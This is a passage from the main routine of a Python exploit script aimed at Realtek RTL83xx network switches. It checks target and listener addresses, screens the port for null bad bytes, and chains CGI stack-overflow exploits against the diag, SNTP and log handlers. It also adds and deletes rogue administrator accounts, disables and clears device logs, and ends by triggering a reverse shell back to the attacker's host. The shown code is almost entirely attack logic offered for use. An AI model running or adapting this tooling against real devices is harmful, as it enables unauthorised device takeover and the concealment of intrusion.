		rport = args.rport

	if args.etag:
		etag = args.etag

	if args.rhost:
		rhost = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
		lhost = args.lhost

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		log.failure("Invalid RPORT - Choose between 1 and 65535")
		sys.exit(1)

	# Check if LPORT is valid
	if not Validate(verbose).Port(lport): #
		log.failure("Invalid LPORT - Choose between 1 and 65535")
		sys.exit(1)

	# Let's break apart the hex code of LPORT into two bytes and check for badbyte 0x00
	port_hex = hex(int(lport))[2:]
	port_hex = port_hex.zfill(len(port_hex) + len(port_hex) % 2)
	port_hex = ' '.join(port_hex[i: i+2] for i in range(0, len(port_hex), 2))
	port_hex = port_hex.split()
	if len(port_hex) == 1:
		port_hex = ('00' + ' ' + ''.join(port_hex)).split()

	for c in port_hex:
		if c == '00':
			log.failure("Choosen port (dec: {}, hex: {}) contains 0x00 - aborting".format(lport,hex(int(lport))))
			sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		log.failure("Invalid RHOST")
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		log.failure("Invalid LHOST")
		sys.exit(1)

	#
	# Validation done, start print out stuff to the user
	#
	if args.https:
		log.info("HTTPS / SSL Mode Selected")
	log.info("RHOST: {}".format(rhost))
	log.info("RPORT: {}".format(rport))
	log.info("LHOST: {}".format(lhost))
	log.info("LPORT: {}".format(lport))

	rhost = rhost + ':' + rport

	try:

		headers = {
			'Host':rhost,
			'User-Agent':'Chrome',
			'Accept':'*/*',
			'Content-Type':'application/x-www-form-urlencoded'
			}
		#
		# We can manually select target with the '--etag'
		#
		target = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).check_remote(etag)

		#
		# Whole code based on known 'target's ETag
		#
		if target:

			if args.verify:
				RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).verify_target(target,True) # check all listed

			elif args.hydra:
				if not target['exploit']['heack_hydra_shell']['safe'] and not args.force:
					log.failure("Boa/Hydra listed as not safe (most likely DoS), force with '--force'")
					log.failure("The best chance of success is with fresh heap and select target model manually")
					log.failure("use '--etag' for manual selection, '--etag help' for known targets")
					success = False
				else:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).heack_hydra_shell(target)
					success = False

			elif args.adduser:
				if target['exploit']['stack_cgi_add_account']['vulnerable']:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_add_account(target)
				else:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).add_user(target)

			elif args.deluser:
				if target['exploit']['stack_cgi_del_account']['vulnerable']:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_del_account(target)
				else:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).login(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).del_user(target)
						if success:
							success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).logout(target)

			elif args.shell:
				success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).verify_target(target,False) # check only one

				#
				# shellcode on heap, no need to disable ASLR
				#
				if not target['exploit']['heack_cgi_shell']['stack']:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_cgi_log(target)
				#
				# shellcode on stack, we need to disable ASLR
				#
				elif target['exploit']['stack_cgi_diag']['vulnerable']:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_cgi_log(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_cgi_diag(target)
				elif target['exploit']['stack_cgi_sntp']['vulnerable']:
					success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_cgi_log(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).stack_cgi_sntp(target)
				#
				# or we take the long way
				#
				elif target['login']['vulnerable'] and not target['exploit']['stack_cgi_diag']['vulnerable'] or not target['exploit']['stack_cgi_sntp']['vulnerable']:
					if not args.auth:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).add_user(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).login(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).disable_clean_log(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).SNTP(target)

					if success and not args.auth:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).del_user(target)
					if success:
						success = RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).logout(target)

				else:
					log.failure("We have no way to reach shellcode...")
					success = False

				#
				# No meaning to try exploit if above failed
				#
				if success:
					RTK_RTL83xx(rhost, proto, verbose, creds, raw_request,lhost, lport).heack_shell(target)

	except Exception as e:
		log.info("Failed: ({})".format(e))

	log.info("All done...")

	sys.exit(0)


